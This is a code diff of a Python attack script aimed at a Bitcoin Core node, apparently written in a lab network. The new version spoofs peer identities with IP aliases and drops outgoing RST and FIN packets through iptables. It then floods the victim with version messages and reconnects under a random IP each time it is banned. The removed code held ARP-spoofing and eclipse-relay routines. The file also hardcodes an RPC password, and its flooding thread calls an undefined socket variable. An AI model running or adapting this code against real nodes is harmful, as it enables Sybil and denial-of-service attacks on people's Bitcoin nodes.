@@ -1,66 +1,66 @@
 from _thread import start_new_thread
-from scapy.all import *
-import socket
-import atexit
-import json
-import os
-import time
-import bitcoin
 from bitcoin.messages import *
 from bitcoin.net import CAddress
-
-from teeceepee.tcp import TCPSocket
-from teeceepee.tcp_listener import TCPListener
+from io import BytesIO as _BytesIO
+import atexit
+import bitcoin
 import fcntl
+import hashlib
+import json
+import os
+import random
+import re
+import socket
 import struct 
-
-
+import time
 
 # Percentage (0 to 1) of packets to drop, else: relayed to victim
 eclipse_packet_drop_rate = 0
 
-
-num_identities = 3
-network_interface = 'enp0s3'
-ip_alias_network_interface = 'wlan0'
+num_identities = 1
 
 victim_ip = '10.0.2.4'
 victim_port = 8333
 
 attacker_ip = '10.0.2.15'
-attacker_port = random.randint(1024,65535)
 
-spoof_IP_and_ports = []
-spoof_IP_sockets = []
+identity_interface = [] # Keeps the IP alias interface and IP for each successful connection
+identity_address = [] # Keeps the IP and port for each successful connection
+identity_socket = [] # Keeps the socket for each successful connection
 
+# The file where the iptables backup is saved, then restored when the script ends
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
 
-"""
-def ip_alias(ip_address):
-	print(f'Setting up IP alias {ip_address}')
-	global alias_num
-	#terminal(f'sudo iptables -i {ip_alias_network_interface}:{alias_num} {ip_address} up')
-
-	terminal(f'iptables -t nat -A PREROUTING -d {ip_address} -j DNAT --to-destination 0.0.0.0')
-
-	#terminal(f'iptables -A INPUT -p tcp -s {ip_address} -j ACCEPT')
-	#terminal(f'iptables -A OUTPUT -p tcp -d  {ip_address} -j ACCEPT')
-	alias_num += 1
-"""
-
+# Send commands to the Linux terminal
 def terminal(cmd):
-	# print('\n> '+cmd)
 	return os.popen(cmd).read()
 
+# Send commands to the Bitcoin Core Console
 def bitcoin(cmd):
 	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()
 
+# Generate a random identity using the broadcast address template
 def random_ip():
-	return f'10.0.4.4'#{str(random.randint(0, 255))}'
-	#return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
+	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
+	ip = broadcast_address
+	old_ip = ''
+	while(old_ip != ip):
+		old_ip = ip
+		ip = ip.replace('255', str(random.randint(0, 255)), 1)
+	return ip
 
+# Create an alias for a specified identity
+def ip_alias(ip_address):
+	global alias_num
+	print(f'Setting up IP alias {ip_address}')
+	interface = f'{network_interface}:{alias_num}'
+	terminal(f'sudo ifconfig {interface} {ip_address} netmask 255.255.255.0 broadcast {broadcast_address} up')
+	alias_num += 1
+	return interface
+
+# Construct a version packet using python-bitcoinlib
 def version_packet(src_ip, dst_ip, src_port, dst_port):
-	msg = msg_version()
+	msg = msg_version(bitcoin_protocolversion)
 	msg.nVersion = bitcoin_protocolversion
 	msg.addrFrom.ip = src_ip
 	msg.addrFrom.port = src_port
@@ -69,244 +69,123 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	# Default is /python-bitcoinlib:0.11.0/
 	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
 	return msg
-"""
-def custom_packet(msgtype, src_ip, dst_ip, src_port, dst_port):
-	msg = None
-	if msgtype == 'version':
-		msg = msg_version(bitcoin_protocolversion)
-	elif msgtype == 'verack':
-		msg = msg_verack(bitcoin_protocolversion)
-	elif msgtype == 'addr':
-		msg = msg_addr(bitcoin_protocolversion)
-	elif msgtype == 'inv':
-		msg = msg_inv(bitcoin_protocolversion)
-	elif msgtype == 'getdata':
-		msg = msg_getdata(bitcoin_protocolversion)
-	#elif msgtype == 'merkleblock':
-	#	msg = msg_merkleblock(bitcoin_protocolversion)
-	elif msgtype == 'getblocks':
-		msg = msg_getblocks(bitcoin_protocolversion)
-	elif msgtype == 'getheaders':
-		msg = msg_getheaders(bitcoin_protocolversion)
-	elif msgtype == 'tx':
-		msg = msg_tx(bitcoin_protocolversion)
-	elif msgtype == 'headers':
-		msg = msg_headers(bitcoin_protocolversion)
-	elif msgtype == 'block':
-		msg = msg_block(bitcoin_protocolversion)
-	elif msgtype == 'getaddr':
-		msg = msg_getaddr(bitcoin_protocolversion)
-	elif msgtype == 'mempool':
-		msg = msg_mempool(bitcoin_protocolversion)
-	elif msgtype == 'ping':
-		msg = msg_ping(bitcoin_protocolversion)
-	elif msgtype == 'pong':
-		msg = msg_pong(bitcoin_protocolversion)
-	#elif msgtype == 'notfound':
-	#	msg = msg_notfound(bitcoin_protocolversion)
-	#elif msgtype == 'filterload':
-	#	msg = msg_filterload(bitcoin_protocolversion)
-	#elif msgtype == 'filteradd':
-	#	msg = msg_filteradd(bitcoin_protocolversion)
-	#elif msgtype == 'filterclear':
-	#	msg = msg_filterclear(bitcoin_protocolversion)
-	#elif msgtype == 'sendheaders':
-	#	msg = msg_sendheaders(bitcoin_protocolversion)
-	#elif msgtype == 'feefilter':
-	#	msg = msg_feefilter(bitcoin_protocolversion)
-	#elif msgtype == 'sendcmpct':
-	#	msg = msg_sendcmpct(bitcoin_protocolversion)
-	#elif msgtype == 'cmpctblock':
-	#	msg = msg_cmpctblock(bitcoin_protocolversion)
-	#elif msgtype == 'getblocktxn':
-	#	msg = msg_getblocktxn(bitcoin_protocolversion)
-	#elif msgtype == 'blocktxn':
-	#	msg = msg_blocktxn(bitcoin_protocolversion)
-	#elif msgtype == 'reject':
-	#	msg = msg_reject()
-	else:
-		return None
 
-	#msg.addrFrom.ip = src_ip
-	#msg.addrFrom.port = src_port
-	#msg.addrTo.ip = dst_ip
-	#msg.addrTo.port = dst_port
-	return msg
-"""
+# Close a connection
+def close_connection(index):
+	if index < 0 and index >= len(identity_socket):
+		print('Error: Failed to close connection')
+		return
+	ip, port = identity_address[index]
+	interface = identity_interface[index]
+	socket = identity_socket[index]
 
-# str_addrs = ['1.2.3.4', '5.6.7.8', '9.10.11.12'...]
-def addr_packet(str_addrs):
-	msg = msg_addr()
-	addrs = []
-	for i in str_addrs:
-		addr = CAddress()
-		addr.port = 18333
-		addr.nTime = int(time.time())
-		addr.ip = i
+	del identity_address[index]
+	del identity_socket[index]
+	del identity_interface[index]
 
-		addrs.append(addr)
-	msg.addrs = addrs
-	return msg
+	socket.close()
+	terminal(f'sudo ifconfig {interface} {ip} down')
 
-# Make web traffic go towards the fake IP
-def arp_spoof(fake_ip, mac_address):
-	try:
-		for _ in range(5):
-			srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=fake_ip, hwsrc=mac_address), verbose=0, timeout=0.05)
-			time.sleep(0.05)
-	except socket.error:
-		# Are you sure you're running as root?
-		print('Error: You need to run this script as root.')
-		sys.exit()
+	print(f'Successfully closed connection to ({ip} : {port})')
 
-def get_mac_address(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(ifname, 'utf-8')[:15]))
-    return ':'.join('%02x' % b for b in info[18:24])
-
-def initialize_fake_connection(src_ip, dst_ip):
-	########## Temporary
-	#src_ip = attacker_ip
-	##########
-	src_port = attacker_port
+# Creates a fake connection to the victim
+def make_fake_connection(src_ip, dst_ip, verbose=True):
+	src_port = random.randint(1024, 65535)
 	dst_port = victim_port
-	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
+	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
 
-	#mac_address = get_mac_address(network_interface)
-	#arp_spoof(src_ip, mac_address)
+	interface = ip_alias(src_ip)
+	identity_interface.append(interface)
+	if verbose: print(f'Successfully set up IP alias on interface {interface}')
+	if verbose: print('Resulting ifconfig interface:')
+	if verbose: print(terminal(f'ifconfig {interface}').rstrip() + '\n')
 
-	print('Setting iptables')
-	#print(terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -d {dst_ip} -j DROP'))
-	print(terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP'))
-	#print(terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP'))
-	#time.sleep(5)
-	print(terminal('sudo iptables -L'))
-	#print(terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {dst_port} -j DROP'))
+	if verbose: print('Setting up iptables configurations')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL FIN -j DROP')
+	terminal(f'sudo iptables -I OUTPUT -o {interface} -p tcp --tcp-flags ALL RST -j DROP')
 
+	if verbose: print('Creating network socket...')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	
+	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
+	s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+	
+	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
+	s.bind((src_ip, src_port))
 
-
-	#ip_alias(src_ip)
-	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP')
-
-	listener = TCPListener(src_ip)
-	s = TCPSocket(listener)
-	s.connect(dst_ip, dst_port)
-
-	print(f'Status: {s.state}')
-	print('Connection complete?')
-	"""seq = random.randrange(0,2**16)
-	ip = IP(src=src_ip, dst=dst_ip)
-	SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
-	#SYN = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
-	SYNACK=sr1(ip/SYN)
-	#send(SYNACK)
-	#time.sleep(1)
-	#print('Sending second packet')
-	ack = SYNACK.seq + 1
-	seq += 1
-	ACK=TCP(sport=src_port, dport=dst_port, flags='A', seq=seq, ack=ack)
-	send(ip/ACK)
-	print('Handshake COMPLETE')
-
-	PUSH = TCP(sport=src_port, dport=dst_port, flags='PA', seq=11, ack=ack)
-	send(version_packet(src_ip, dst_ip, dst_port).to_bytes())
-	"""
-
-	#ip_alias(src_ip)
-
-
-	#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	#s.connect((dst_ip, dst_port))
+	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
+	s.connect((dst_ip, dst_port))
 
 	# Send version packet
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
-	print(version)
-
-	s.send(str(version.to_bytes()))
+	s.send(version.to_bytes())
 	# Get verack packet
-	print('\n\n*** ')
-	print(s.recv(1924, timeout=60)) # Next message received must be <= 1924 bytes
+	verack = s.recv(1924)
 	# Send verack packet
-	print('Received version response')
-
-	verack = msg_verack()
-	print(verack)
-	s.send(str(verack.to_bytes()))
+	verack = msg_verack(bitcoin_protocolversion)
+	s.send(verack.to_bytes())
 	# Get verack packet
-	print('\n\n*** ')
-	print(s.recv(1024, timeout=60)) # Next message received must be <= 1024 bytes
+	verack = s.recv(1024)
 
-	print('Received verack response')
+	if verbose: print('Connection successful!')
 
-	spoof_IP_and_ports.append((src_ip, src_port))
-	spoof_IP_sockets.append(s)
+	identity_address.append((src_ip, src_port))
+	identity_socket.append(s)
 
-	print('\n\n*** ')
-	print('CONNECTION ESTABLISHED')
+	index = len(identity_socket) - 1
 
-	#time.sleep(5)
-	#s.close()
-	#print('CONNECTION CLOSED')
-
-def packet_received(packet):
+	# Listen to the connections for future packets
+	if verbose: print('Attaching attacker script {interface}')
 	try:
-		magic_number = packet.load[0:4]
-		if magic_number != b'\xf9\xbe\xb4\xd9':
-			return # Only allow Bitcoin messages
+		start_new_thread(attack, (), {
+			'socket': s,
+			'src_ip': src_ip,
+			'src_port': src_port,
+			'dst_ip': dst_ip,
+			'dst_port': dst_port,
+			'interface': interface,
+			'index': index 
+		})
 	except:
-		return
+		print('Error: unable to  start thread to sniff interface {interface}')
 
-	# Filter out sources that are not the victim
-	#if packet[IP].src != victim_ip:
-	#	return
-	# Filter out destinations that are not a spoofed IP
-	#if not packet[IP].dst in unprocessed_IPs:
-	#	return
+def attack(socket, src_ip, src_port, dst_ip, dst_port, interface, index):
+	while True:
+		try:
+			s.send(version_packet(src_ip, dst_ip, src_port, dst_port).to_bytes())
+		except:
+			print(f'Peer was banned ({src_ip} : {src_port})')
+			close_connection(index)
+			make_fake_connection(random_ip(), dst_ip, False)
 
-	#packet.show()
-	#packet.show2()
-	msgtype = packet.load[4:16].decode()
-	print(f'src={packet[IP].src}, dst={packet[IP].dst}, msg={msgtype}')
-
-	# Relay Bitcoin packets that aren't from the victim
-	if packet[IP].dst == attacker_ip and packet[IP].src != victim_ip:
-		if len(spoof_IP_sockets) > 0:
-			if random.random() > eclipse_packet_drop_rate:
-				rand_i = random.randint(0, len(spoof_IP_sockets) - 1)
-				rand_ip = spoof_IP_and_ports[rand_i][0]
-				rand_port = spoof_IP_and_ports[rand_i][1]
-				rand_socket = spoof_IP_sockets[rand_i]
-
-				print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
-				#packet[IP].src = rand_ip
-				#packet[IP].dst = victim_ip
-
-				try:
-					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
-					#if custom is not None:
-					#	rand_socket.send(custom.to_bytes())
-
-					ip = IP(dst = victim_ip)
-					tcp = TCP(sport=rand_port, dport=victim_port, flags='S')
-					new_packet = ip/tcp/packet[TCP].payload
-					rand_socket.send(bytes(new_packet))
-
-				except Exception as e:
-					print('Relaying message FAILED')
-					print(e)
-
-	if msgtype == 'verack':
-		# Successful connection! Move from pending to successful
-		pass
-	elif msgtype == 'ping':
-		# send pong
-		pass
-
-
+# Called when
 def initialize_network_info():
+	print('Retrieving network info...')
+	global network_interface, broadcast_address
+
+	# Get the network interface of the default gateway
+	m = re.search(r'\n_gateway +[^ ]+ +[^ ]+ +[^ ]+ +([^ ]+)\n', terminal('arp'))
+	if m != None:
+		network_interface = m.group(1).strip()
+	else:
+		print('Error: Network interface couldn\'t be found.')
+		sys.exit()
+
+	# Get the broadcast address of the network interface
+	# Used as an IP template of what can change, so that packets still come back to the sender
+	m = re.search(r'broadcast ([^ ]+)', terminal(f'ifconfig {network_interface}'))
+	if m != None:
+		broadcast_address = m.group(1).strip()
+	else:
+		print('Error: Network broadcast IP couldn\'t be found.')
+		sys.exit()
+
+def initialize_bitcoin_info():
+	print('Retrieving bitcoin info...')
 	global bitcoin_subversion
 	global bitcoin_protocolversion
-
 	bitcoin_subversion = '/Satoshi:0.18.0/'
 	bitcoin_protocolversion = 70015
 	try:
@@ -318,65 +197,56 @@ def initialize_network_info():
 	except:
 		pass
 
+# Save a backyp of the iptable rules
 def backup_iptables():
 	terminal(f'iptables-save > {iptables_file_path}')
 
+# Restore the backup of the iptable rules
 def cleanup_iptables():
 	if(os.path.exists(iptables_file_path)):
-		print('Cleaning up iptables...')
+		print('Cleaning up iptables configuration')
 		terminal(f'iptables-restore < {iptables_file_path}')
 		os.remove(iptables_file_path)
 
-# Ran when the script ends
+# Remove all ip aliases that were created by the script
+def cleanup_ipaliases():
+	for i in range(0, len(identity_address)):
+		ip = identity_address[i][0]
+		interface = identity_interface[i]
+		print(f'Cleaning up IP alias {ip} on {interface}')
+		terminal(f'sudo ifconfig {interface} {ip} down')
+
+# This function is ran when the script is stopped
 def on_close():
-	for socket in spoof_IP_sockets:
-		print(f'CLOSING SOCKET {socket}')
+	print('Closing open sockets')
+	for socket in identity_socket:
 		socket.close()
+	cleanup_ipaliases()
 	cleanup_iptables()
-	print('Goodbye.')
+	print('Cleanup complete. Goodbye.')
 
 
-# MAIN
+# This is the first code to run
 if __name__ == '__main__':
 	global alias_num
 	alias_num = 0 # Increments each alias
 
 	initialize_network_info()
-	atexit.register(on_close)
-	cleanup_iptables()
+	initialize_bitcoin_info()
+
+	atexit.register(on_close) # Make on_close() run when the script terminates
+	cleanup_iptables() # Restore any pre-existing iptables before backing up, just in case if the computer shutdown without restoring
 	backup_iptables()
 
-	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -dport {victim_port} -j DROP')
-	#terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
-	# Make the spoofing IP up
-	#terminal('sudo iptables -A INPUT -m state --state NEW ! -i wlan0 -j ACCEPT')
-	#terminal('sudo ifconfig wlan0 up')
-
-	#time.sleep(10)
-	try:
-		start_new_thread(sniff, (), {
-			'iface':network_interface,
-			'prn':packet_received,
-			'filter':'tcp',
-			'store':1
-		})
-	except:
-		print('Error: unable to  start thread')
-
+	# Create the connections
 	for i in range(1, num_identities + 1):
 		try:
-			initialize_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
+			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
 		except ConnectionRefusedError:
 			print('Connection was refused. The victim\'s node must not be running.')
-	print(f'Successful connections: {len(spoof_IP_and_ports)}\n')
 
+	print(f'Successful connections: {len(identity_address)}\n')
 
+	# Prevent the script from terminating when the sniff function is still active
 	while 1:
-		time.sleep(1)
-
-	# Simeon Home
-	#sniff(iface="enp0s3",prn=packet_received, filter="tcp", store=1) #L
-	#sniff(iface="wlp2s0",prn=packet_received, filter="tcp", store=1)
-
-	# Cybersecurity Lab
-	#sniff(iface="enp0s3",prn=packet_received, filter="tcp", store=1)
+		time.sleep(60)
